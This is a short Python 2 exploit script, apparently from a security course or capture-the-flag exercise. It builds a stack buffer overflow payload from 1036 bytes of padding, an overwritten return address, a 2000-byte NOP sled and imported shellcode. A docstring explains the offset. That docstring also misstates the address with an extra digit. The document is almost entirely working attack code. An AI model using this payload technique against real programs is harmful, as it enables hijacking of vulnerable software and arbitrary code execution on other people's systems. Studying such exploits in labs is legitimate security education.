'''
pad 1036 bytes to overwrite return with 0xbffeeb660, 
address number is relatively arbatrary and only needs to exist in the memory 
past the old main function but still in the 2000 bytes of \x90 pad.
'''

from shellcode import shellcode

print "\x61"*1036 + "\x66\xeb\xfe\xbf" + "\x90"*2000 + shellcode
